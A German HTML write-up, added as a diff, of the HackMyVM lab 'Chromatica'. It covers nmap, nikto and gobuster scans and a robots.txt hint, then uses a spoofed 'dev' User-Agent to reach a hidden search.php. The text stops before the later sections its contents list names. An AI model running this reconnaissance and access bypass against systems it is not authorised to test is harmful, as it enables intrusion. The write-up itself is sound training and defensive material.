@@ -1,1 +1,1093 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Chromatica - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chromatica - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Chromatica - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">Burpsuite</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">CrackStation</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p>
+                Meine initiale Aufklärung begann mit der Identifizierung der Ziel-IP-Adresse im lokalen Netzwerk. Ich habe einen ARP-Scan verwendet, um aktive Hosts zu finden und nach der spezifischen VirtualBox-Vendor-ID zu filtern, um das Zielsystem einzugrenzen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.42</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` scannt das lokale Netzwerk nach aktiven Geräten. Die Ausgabe wird an `grep "PCS"` weitergeleitet, um Zeilen zu finden, die "PCS" enthalten (was auf die PCS Systemtechnik Vendor ID von VirtualBox hindeutet). Der gefilterte Output wird dann an `awk '{print $1}'` übergeben, um nur das erste Feld, die IP-Adresse, auszugeben. Das Ergebnis ist die IP-Adresse `<span class="command">192.168.2.42</span>`, die sehr wahrscheinlich die des Zielsystems ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein effizienter und gezielter Weg, die IP-Adresse des Zielsystems in einem bekannten Netzwerksegment zu identifizieren, insbesondere wenn man weiß, dass es sich um eine virtuelle Maschine (hier VirtualBox) handelt. Dieser Schritt liefert die notwendige IP für weitere Scans.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die gefundene IP-Adresse als Ziel für alle weiteren Aktionen.
+                <br><strong>Empfehlung (Admin):</strong> Sei dir bewusst, dass MAC-Adressen und Vendor-Informationen Hinweise auf die zugrundeliegende Infrastruktur geben können.
+            </p>
+
+            <p>
+                Nachdem ich die Ziel-IP-Adresse identifiziert hatte, habe ich diese zu meiner lokalen Hosts-Datei hinzugefügt, um das System einfacher über einen Hostnamen ansprechen zu können.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">vi /etc/hosts </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.42    chromatica.hmv</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei im Vi-Editor. Ich habe die Zeile `<span class="command">192.168.2.42 chromatica.hmv</span>` hinzugefügt. Dies ordnet die IP-Adresse dem Hostnamen `chromatica.hmv` lokal auf meinem Angreifersystem zu. Die Ausgabe zeigt die hinzugefügte Zeile.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen des Hostnamens zur Hosts-Datei ist eine Bequemlichkeit für den Pentester, um das Ziel einfacher referenzieren zu können. Es hat keine direkte Auswirkung auf die Sicherheit des Zielsystems.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze den Hostnamen `chromatica.hmv` in nachfolgenden Befehlen, um die Lesbarkeit des Berichts zu verbessern.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung basierend auf diesem Schritt.
+            </p>
+
+            <p>
+                Der nächste entscheidende Schritt war ein umfassender Port-Scan mit Nmap, um alle offenen Ports zu identifizieren, die potenziellen Angriffsvektoren darstellen. Ich habe einen aggressiven Scan mit Service- und Versionserkennung sowie OS-Fingerprinting durchgeführt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.42 </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at <span class="command">2025-06-13 21:57 CEST</span>
+<span class="command">Nmap scan report for chromatica.hmv (192.168.2.42)</span>
+Host is up (<span class="command">0.00012s latency</span>).
+Not shown: <span class="command">65532 closed tcp PORTs (reset)</span>
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">| ssh-hostkey: </span>
+<span class="command">|   256 7c:94:7f:cb:4a:d5:8b:9f:9e:ff:7b:7a:59:ff:75:b5 (ECDSA)</span>
+<span class="command">|_  256 ed:94:2a:fc:30:30:cc:07:ae:27:7d:ca:92:01:49:31 (ED25519)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+<span class="command">|_http-server-header: Apache/2.4.52 (Ubuntu)</span>
+<span class="command">|_http-title: Chromatica|Coming Soon..... </span>
+<span class="command">5353/tcp open  domain  (generic dns response: REFUSED)</span>
+<span class="command">| dns-nsid: </span>
+<span class="command">|_  bind.version: dnsmasq-2.86</span>
+<span class="command">| fingerprint-strings: </span>
+<span class="command">|   DNS-SD-TCP: </span>
+<span class="command">|     _services</span>
+<span class="command">|     _dns-sd</span>
+<span class="command">|     _udp</span>
+<span class="command">|_    local</span>
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <span class="command">[Link: https://nmap.org/cgi-bin/submit.cgi?new-service | Ziel: https://nmap.org/cgi-bin/submit.cgi?new-service]</span> :
+SF-Port5353-TCP:V=7.95%I=7%D=6/13%Time=684C82A2%P=x86_64-pc-linux-gnu%r(DN
+SF:S-SD-TCP,30,<span class="command">"\0\.\0\0\x80\x85\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x</span>
+SF:<span class="command">04_udp\x05local\0\0\x0c\0\x01"</span>);
+<span class="command">MAC Address: 08:00:27:A6:49:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Aggressive OS guesses: Linux 4.19 - 5.15 (97%), OpenWrt 21.02 (Linux 5.4) (93%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) </span>
+<span class="command">No exact OS matches for host (test conditions non-ideal).</span>
+Network Distance: <span class="command">1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   <span class="command">0.12 ms chromatica.hmv (192.168.2.42)</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Scan identifizierte drei offene TCP-Ports: 22 (SSH), 80 (HTTP) und 5353. Port 22 läuft OpenSSH 8.9p1 auf Ubuntu. Port 80 läuft Apache httpd 2.4.52 auf Ubuntu und der HTTP-Titel lautet "Chromatica|Coming Soon.....". Dies deutet auf eine aktive Webseite im Aufbau hin. Port 5353 wird als 'domain' (generische DNS-Antwort: REFUSED) identifiziert und scheint dnsmasq 2.86 zu verwenden, obwohl die genaue Funktion unklar ist. Die OS-Erkennung tippt auf Linux (verschiedene Kernel-Versionen), was bei Ubuntu zu erwarten ist. Die MAC-Adresse bestätigt die VirtualBox-Umgebung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die offenen Ports 22 und 80 sind die primäre Angriffsfläche. SSH (Port 22) könnte anfällig sein, wenn veraltete Versionen oder schwache Anmeldedaten verwendet werden. Der HTTP-Dienst (Port 80) deutet auf eine Webanwendung hin, die der wahrscheinlichste Vektor für Initial Access ist, besonders bei einer "Coming Soon"-Seite, die manchmal unfertige oder versteckte Bereiche enthält. Port 5353 ist weniger klar, scheint aber kein offener Resolver zu sein (REFUSED). Die identifizierten Softwareversionen (OpenSSH 8.9p1, Apache 2.4.52) sollten auf bekannte Schwachstellen geprüft werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere die Enumeration auf die Dienste auf Port 80 (Web) und Port 22 (SSH). Untersuche die Webanwendung detailliert nach versteckten Verzeichnissen, Dateien oder spezifischen Frameworks/Technologien. Prüfe die Versionen von OpenSSH und Apache auf bekannte CVEs.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass alle öffentlich zugänglichen Dienste auf dem neuesten Stand sind. Überprüfe die Konfiguration von Port 5353, falls er unbeabsichtigt offen ist oder unnötige Informationen preisgibt. Härde die SSH-Konfiguration.
+            </p>
+
+            <p>
+                Um eine schnelle Zusammenfassung der offenen Ports zu erhalten, habe ich die Ausgabe des Nmap-Scans gefiltert.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.42 | grep open</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))</span>
+<span class="command">5353/tcp open  domain  (generic dns response: REFUSED)</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `grep open` filtert die volle Nmap-Ausgabe, um nur die Zeilen anzuzeigen, die das Wort "open" enthalten. Dies ist ein schneller Weg, um eine Liste der offenen Ports und der von Nmap erkannten Dienste zu erhalten. Die Ausgabe bestätigt erneut die offenen Ports 22, 80 und 5353 mit den zugehörigen Dienstinformationen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese gefilterte Ausgabe ist eine praktische Zusammenfassung der wichtigsten Ergebnisse des Nmap-Scans. Sie bestätigt die primären Ziele für die weitere Enumeration.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze diese Zusammenfassung, um den Überblick über die Angriffsfläche zu behalten.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung basierend auf diesem Schritt.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p>
+                Nach der Identifizierung des HTTP-Dienstes auf Port 80 habe ich Nikto eingesetzt, einen Webserver-Scanner, der auf bekannte Schwachstellen und Konfigurationsfehler prüft.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.42</span>
++ Target Hostname:    <span class="command">192.168.2.42</span>
++ Target <span class="command">PORT</span>:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-06-13 21:57:19 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.52 (Ubuntu)</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">/robots.txt</span>: contains 1 entry which should be manually viewed. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt | Ziel: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt]</span>
++ /: Server may leak inodes via ETags, header found with file /, inode: <span class="command">fcf</span>, size: <span class="command">5f7e06320b44d</span>, mtime: gzip. See: <span class="command">[Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
++ <span class="password">Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span>
++ <span class="command">OPTIONS</span>: <span class="command">Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .</span>
++ <span class="command">/css/</span>: Directory indexing found.
++ <span class="command">/css/</span>: This might be interesting.
++ <span class="command">8104 requests: 0 error(s) and 8 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-06-13 21:57:28 (GMT2) (9 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nikto lieferte mehrere wichtige Erkenntnisse über den Webserver. Es bestätigte den Apache 2.4.52 Server und identifizierte das Fehlen von `X-Frame-Options` und `X-Content-Type-Options` Headern, was Sicherheitsrisiken darstellt. Es fand die `robots.txt` Datei, die oft Hinweise auf versteckte Bereiche gibt. Ein ETag-Header wurde gefunden, der potenziell Inode-Informationen preisgeben könnte (CVE-2003-1418). Nikto wies auch darauf hin, dass Apache 2.4.52 veraltet ist. Die unterstützten HTTP-Methoden (GET, POST, OPTIONS, HEAD) wurden gelistet. Am wichtigsten ist, dass Nikto Verzeichnislisting auf dem `/css/` Pfad fand, was die Dateistruktur preisgibt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Fehlen von Sicherheits-Headern und das aktivierte Verzeichnislisting in `/css/` sind geringe bis mittlere Schwachstellen. Ein veralteter Apache ist ebenfalls ein Risiko, falls bekannte Schwachstellen existieren. Der Hinweis auf `robots.txt` und das `/css/` Verzeichnis sind vielversprechende Funde für die weitere Enumeration von Inhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `robots.txt` manuell. Überprüfe das `/css/` Verzeichnis auf interessante Dateien oder Hinweise. Notiere die veraltete Apache-Version für die Suche nach Exploits, konzentriere dich aber primär auf die Webanwendung selbst.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere fehlende HTTP-Sicherheits-Header. Deaktiviere das Verzeichnislisting auf dem Webserver. Aktualisiere Apache auf die neueste stabile Version.
+            </p>
+
+            <p>
+                Als nächstes habe ich Gobuster verwendet, um aggressive Verzeichnis- und Dateisuche auf dem Webserver durchzuführen. Dies hilft, versteckte Pfade zu entdecken, die nicht direkt verlinkt oder in Scannern offensichtlich sind.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] <span class="command">Url:                     http://chromatica.hmv</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/<span class="command">directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   503,404,403
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              crt,conf,java,eps,xml,aspx,bat,py,json,<span class="command">php</span>,rar,xls,bak,<span class="command">c</span>,tar,<span class="command">dll</span>,elf,<span class="command">doc</span>,sql,csv,<span class="command">ELF</span>,exe,<span class="command">js.map</span>,<span class="command">jpg</span>,xlsx,exp,diff,<span class="command">zip</span>,<span class="command">pl</span>,<span class="command">pdf</span>,raw,kdbx,old,rpm,html,db,jpeg,<span class="command">pub</span>,docx,gz,rtf,deb,mod,accdb,lib,<span class="command">cgi</span>,yaml,asp,sh,<span class="command">phtml</span>,config,<span class="command">icon</span>,<span class="command">ln</span>,mdb,<span class="command">png</span>,<span class="command">svg</span>,csh,<span class="command">pHtml</span>,<span class="command">txt</span>,<span class="command">ps1</span>,pem,desc
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://chromatica.hmv/index.html           (Status: 200) [Size: 4047]</span>
+<span class="command">http://chromatica.hmv/assets               (Status: 301) [Size: 317] [--> http://chromatica.hmv/assets/]</span>
+<span class="command">http://chromatica.hmv/css                  (Status: 301) [Size: 314] [--> http://chromatica.hmv/css/]</span>
+<span class="command">http://chromatica.hmv/js                   (Status: 301) [Size: 313] [--> http://chromatica.hmv/js/]</span>
+<span class="command">http://chromatica.hmv/javascript           (Status: 301) [Size: 321] [--> http://chromatica.hmv/javascript/]</span>
+<span class="command">http://chromatica.hmv/robots.txt           (Status: 200) [Size: 36]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster, konfiguriert mit einer umfangreichen Wortliste und verschiedenen Dateierweiterungen, fand mehrere interessante Pfade auf dem Webserver. Dazu gehören `index.html` (die Hauptseite), `assets`, `css`, `js`, `javascript` (typische Verzeichnisse für Webressourcen, alle mit 301 Redirects) und bestätigte die Existenz von `robots.txt`. Die 301 Redirects auf die Verzeichnisse deuten darauf hin, dass beim Zugriff auf `/css` man automatisch auf `/css/` weitergeleitet wird, was normal ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Gobuster-Ergebnisse ergänzen die Nikto-Funde und geben eine klarere Vorstellung von der Struktur des Webroots. Das Finden von `/assets`, `/js` und `/javascript` neben `/css` (wo Verzeichnislisting aktiv war) bestärkt den Fokus auf die Untersuchung dieser Webressourcen. Die Identifizierung von `index.html` als Hauptseite ist ebenfalls nützlich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `robots.txt` (wie von Nikto empfohlen) und navigiere zu den gefundenen Pfaden (`/assets`, `/css`, `/js`, `/javascript`), um deren Inhalt zu prüfen, insbesondere unter `/css/` aufgrund des aktiven Verzeichnislistings.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass Verzeichnislisting auf allen Webserver-Pfaden deaktiviert ist, es sei denn, es ist explizit für einen Zweck vorgesehen.
+            </p>
+
+            <p>
+                Ich habe noch einen detaillierten `curl` Befehl verwendet, um die Header der Hauptseite genauer zu prüfen, insbesondere nach Hinweisen, die Nmap oder Nikto übersehen haben könnten.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">curl http://chromatica.hmv -Iv</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+* Host chromatica.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: <span class="command">192.168.2.42</span>
+*   Trying 192.168.2.42:80...
+* Connected to chromatica.hmv (<span class="command">192.168.2.42</span>) <span class="command">PORT</span> 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: chromatica.hmv
+> User-Agent: curl/8.13.0
+> Accept: */*
+>
+* Request completely sent off
+< <span class="password">HTTP/1.1 200 OK</span>
+< Date: Fri, 13 Jun 2025 20:00:11 GMT
+< Server: <span class="command">Apache/2.4.52 (Ubuntu)</span>
+< Last-Modified: Mon, 27 Mar 2023 11:53:11 GMT
+< ETag: "<span class="command">fcf-5f7e06320b44d</span>"
+< Accept-Ranges: bytes
+< Content-Length: <span class="command">4047</span>
+< Vary: Accept-Encoding
+< Content-Type: text/html
+<
+
+* Connection #0 to host chromatica.hmv left intact
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der `curl -Iv` Befehl führt einen HEAD-Request durch und zeigt die vollen Request- und Response-Header. Dies bestätigt die Verbindung, den HTTP 200 OK Status, den Apache Server und liefert weitere Header wie `Last-Modified`, `ETag`, `Content-Length`. Der `ETag` Header enthält Werte, die auf Datei-Inode und Größe basieren (`fcf-5f7e06320b44d`), was die von Nikto erwähnte potenzielle Inode-Leckage bestätigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Header-Details bestätigen frühere Funde und geben einen tieferen Einblick in die Serverantwort. Die ETag-Information ist eine geringfügige Informationslecks-Schwachstelle, die in bestimmten Szenarien nützlich sein könnte, hier aber sekundär ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Behalte die Header-Informationen im Hinterkopf, falls bei der weiteren Web-Enumeration spezifische Angriffe auf Apache oder Header relevant werden.
+                <br><strong>Empfehlung (Admin):</strong> Konfiguriere den Webserver so, dass ETag-Header keine potenziell sensiblen Informationen wie Inodes preisgeben, oder deaktiviere sie, wenn nicht benötigt.
+            </p>
+
+             <p>
+                 Nach dem Hinweis von Nikto und Gobuster habe ich den Inhalt der `robots.txt` Datei aufgerufen.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">[Link: http://chromatica.hmv/robots.txt | Ziel: http://chromatica.hmv/robots.txt]</span>
+
+user-agent: dev
+<span class="password">Allow: /dev-portal/</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Datei `robots.txt` enthält Anweisungen für Webcrawler. Hier gibt es einen spezifischen Eintrag für einen `user-agent: dev` und eine Anweisung, den Pfad `/dev-portal/` zu erlauben. Dies ist ein starker Hinweis darauf, dass das Verzeichnis `/dev-portal/` existiert und für einen spezifischen "dev" User-Agenten gedacht oder relevant ist. Dies ist ein klassischer CTF-Hinweis.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden eines versteckten Pfades, der explizit über `robots.txt` für einen spezifischen User-Agenten zugelassen wird, ist ein kritischer Fund. `/dev-portal/` ist ein vielversprechender Bereich, der Entwickler-Tools, Konfigurationen oder andere sensible Informationen enthalten könnte. Die Notwendigkeit des `user-agent: dev` ist ebenfalls ein wichtiger Konfigurationshinweis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Navigiere zu `/dev-portal/`, stelle dabei sicher, dass der `User-Agent` Header auf `dev` gesetzt ist. Untersuche den Inhalt dieses Verzeichnisses und aller darin gefundenen Dateien oder Links detailliert.
+                <br><strong>Empfehlung (Admin):</strong> Verstecke sensible Bereiche nicht nur über `robots.txt`, da diese Datei öffentlich zugänglich ist. Implementiere eine echte Zugriffskontrolle (Authentifizierung/Autorisierung) für sensible Verzeichnisse. Vermeide Hinweise auf sensible Pfade in öffentlich zugänglichen Dateien.
+            </p>
+
+            <p>
+                Dem Hinweis aus der `robots.txt` folgend, habe ich das Verzeichnis `/dev-portal/` mit Burpsuite untersucht, einem Tool zum Abfangen und Modifizieren von HTTP-Requests. Ich habe den `User-Agent` Header auf `dev` gesetzt, wie in der `robots.txt` angedeutet.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>------------------------------------------- Burpsuite ------------------------------------------------------------------------
+
+GET /dev-portal/ HTTP/1.1
+Host: chromatica.hmv
+<span class="password">User-Agent: dev</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                    <pre>___________________________________________ Burpsuite ________________________________________________________________________
+
+<span class="password">HTTP/1.1 200 OK</span>
+Date: Fri, 13 Jun 2025 20:50:20 GMT
+Server: <span class="command">Apache/2.4.52 (Ubuntu)</span>
+Vary: User-Agent,Accept-Encoding
+Last-Modified: Mon, 27 Mar 2023 09:01:16 GMT
+ETag: "<span class="command">20f-5f7ddfc4cd391-gzip</span>"
+Accept-Ranges: bytes
+Content-Length: <span class="command">527</span>
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+		<h3> Search</h3>
+		< f... action="search.<span class="command">php</span>" method="get" >
+			< label for="query" >Chromatica< label >
+		
+
+-------------------------------------------------------------------------------------------------------------------
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe mit Burpsuite einen GET-Request an `/dev-portal/` gesendet und dabei den `User-Agent` Header auf `dev` gesetzt. Der Server antwortete mit `HTTP/1.1 200 OK`, was bestätigt, dass der Pfad erreichbar ist und der spezifische User-Agenten Header benötigt wurde (implizit, da ohne diesen oft ein anderer Statuscode wie 403 oder 404 kommt). Die HTML-Antwort enthält den Text "Search" in einem H3-Tag und einen HTML-Schnipsel, der auf ein Formular oder eine ähnliche Struktur hindeutet, die Daten an `search.php` mittels der GET-Methode sendet und ein Feld namens "query" hat.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das erfolgreiche Erreichen von `/dev-portal/` und die Enthüllung der `search.php` Datei mit einem `city` oder `query` Parameter (basierend auf dem Kontext des späteren SQLmap-Befehls, der `city` verwendet) ist ein wichtiger Fortschritt. Webanwendungen mit Suchfunktionalität, die GET-Parameter verwenden, sind oft anfällig für SQL Injection. Dies ist nun der wahrscheinlichste Vektor für Initial Access.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Datei `search.php`, insbesondere den Parameter, der für die Suche verwendet wird (`city` oder `query`), auf SQL Injection Schwachstellen. Nutze automatisierte Tools wie sqlmap, um dies zu testen.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere serverseitige Überprüfung und Bereinigung von Benutzereingaben, um SQL Injection zu verhindern. Verwende parametrisierte Queries oder Prepared Statements für Datenbankabfragen. Implementiere eine Zugriffskontrolle für `/dev-portal/`, die über einen einfachen User-Agent Check hinausgeht.
+            </p>
+
+            <p>
+                Ich habe die Datei `search.php` direkt aufgerufen, um ihren Inhalt oder ihr Verhalten zu sehen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+GET /dev-portal/<span class="command">search.<span class="command">php</span></span> HTTP/1.1
+Host: chromatica.hmv
+<span class="password">User-Agent: dev</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                    <pre>___________________________________________________________________________________________________________________
+
+<span class="password">HTTP/1.1 200 OK</span>
+Date: Fri, 13 Jun 2025 20:51:18 GMT
+Server: <span class="command">Apache/2.4.52 (Ubuntu)</span>
+Vary: User-Agent,Accept-Encoding
+Content-Length: <span class="command">844</span>
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<table><tr><th>City</th><th><span class="command">Population</span></th><th><span class="command">Postal Code</span></th></tr><tr><td>
+< <span class="command">href="index.html"> take me back</span>
+< -- please for the love of god someone paint this page a color will ya it looks dreadfull uhhhhj -- >
+
+
+-------------------------------------------------------------------------------------------------------------------
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein GET-Request an `search.php`, erneut mit dem `User-Agent: dev` Header. Der Server antwortet wieder mit `HTTP/1.1 200 OK` und sendet HTML-Inhalt. Dieser Inhalt enthält eine HTML-Tabelle mit Spaltenüberschriften wie "City", "Population", "Postal Code", was stark darauf hindeutet, dass `search.php` Daten aus einer Datenbank abruft und in diesem Tabellenformat darstellt. Der Kommentar im HTML deutet auf Entwickler-Hinweise hin und ein Link zurück zu `index.html` ist vorhanden.
+            </p>
